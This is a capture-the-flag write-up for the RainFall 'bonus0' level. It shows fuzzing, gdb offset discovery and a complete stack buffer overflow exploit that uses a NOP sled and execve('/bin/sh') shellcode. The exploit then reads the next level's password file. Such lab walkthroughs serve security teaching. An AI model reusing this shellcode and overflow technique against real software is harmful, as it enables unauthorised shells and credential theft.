# BONUS0

## Analysis:

First let's try to use the program:
```bash
   bonus0@RainFall:~$ ./bonus0 
   - 
   salut 
   - 
   toi
   salut  toi
   bonus0@RainFall:~$ ./bonus0 popopopopo
   - 
   $(python -c 'print "AAAA" * 100')
   - 
   BBBB
   $(python -c 'print "BBBB BBBB
   bonus0@RainFall:~$ ./bonus0 popopopopo
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
   Segmentation fault (core dumped)
```
It seems the program takes 2 inputs during runtime and prints them, but with large inputs it has a weird behaviour and segfaults. 

Let's try to check what happens in gdb:
```gdb
(gdb) run
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

   Program received signal SIGSEGV, Segmentation fault.
   0x42424242 in ?? ()
```

It seems that we overflowed the EIP register, a good sign for our attack but let's confirm it:
```
   (gdb) info registers
   eax            0x0      0
   ecx            0xffffffff       -1
   edx            0xb7fd28b8       -1208145736
   ebx            0xb7fd0ff4       -1208152076
   esp            0xbffff730       0xbffff730
   ebp            0x42424242       0x42424242
   esi            0x0      0
   edi            0x0      0
   eip            0x42424242       0x42424242
   eflags         0x210282 [ SF IF RF ID ]
   cs             0x73     115
   ss             0x7b     123
   ds             0x7b     123
   es             0x7b     123
   fs             0x0      0
   gs             0x33     51
```

That's perfect, EIP is overflowed with our second input but we need to find the correct offset to properly take control of 
our program.

After some test (not changing first input) we can see that if we give 20 B's as second input it still segfaults:
```
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

   Program received signal SIGSEGV, Segmentation fault.
   0x42424242 in ?? ()
```
Now let's just send CCCCDDDDEEEEFFFFGGGG and not BBBBBBBBBBBBBBBB, it will help us define which bytes overflow the EIP:
```
   (gdb) run
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   CCCCDDDDEEEEFFFFGGGG
   AAAAAAAAAAAAAAAAAAAACCCCDDDDEEEEFFFFGGGG��� CCCCDDDDEEEEFFFFGGGG���

   Program received signal SIGSEGV, Segmentation fault.
   0x46454545 in ?? ()
```
Ok so we now know that the part between quotes in CCCCDDDDE"EEEF"FFFGGGG so "EEEFF" is overflowwing our EIP.
Therefore, if we give same first input and as second input 9 + address + 7, we should be able to exploit the vulnerability.

As shown below, if we provide a larger input as first argument, it actually doesn's change the offset if input 2 stays the same:
```
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   CCCCDDDDEEEEFFFFGGGG
   AAAAAAAAAAAAAAAAAAAACCCCDDDDEEEEFFFFGGGG��� CCCCDDDDEEEEFFFFGGGG���

   Program received signal SIGSEGV, Segmentation fault.
   0x46454545 in ?? ()
```

## Solution

We can try to create a NOP sled with a shellcode in first command and and use the second command to point to that NOP sled.
First, the right way to give two inputs to such program that uses 2 reads during runtime is the following: 
(python -c 'CMD'; python -c 'CMD') | ./bin.

But the first step is to check where our first input would land by breaking after read. Indeed, this line
is a common use to get the address of a local variable on the stack so it might be what we're looking for:
```
   bonus0@RainFall:~$ gdb ./bonus0 
   (gdb) break *p+58
   Breakpoint 2 at 0x80484ee
   (gdb) run < <(python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
   Breakpoint 2, 0x080484ee in p ()
   (gdb) x/500x $esp
   0xbfffe660:     0x00000000      0x0000000a      0x00001000      0x00000000
   0xbfffe670:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe680:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe690:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6a0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6b0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6c0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6d0:     0x90909090      0x90909090      0x90909090      0x90909090 <=====
   0xbfffe6e0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6f0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe700:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe710:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe720:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe730:     0x90909090      0x90909090      0xdb31c031      0x80cd06b0
   0xbfffe740:     0x742f6853      0x2f687974      0x89766564      0x66c931e3
   0xbfffe750:     0xb02712b9      0x3180cd05      0x2f6850c0      0x6868732f
   0xbfffe760:     0x6e69622f      0x5350e389      0xb099e189      0x0a80cd0b
```

This does look like our NOP Slep + shellcode ! so let's choose an address in the middle of our NOPs for our payload, this one 0xbfffe6d0:
```bash 
   
   bonus0@RainFall:~$ (python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 9 + "\xd0\xe6\xff\xbf" + "C" * 7'; cat) | ./bonus0
   - 
   - 
   ��������������������BBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
   $ whoami
   bonus1
   $ cat /home/user/bonus1/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```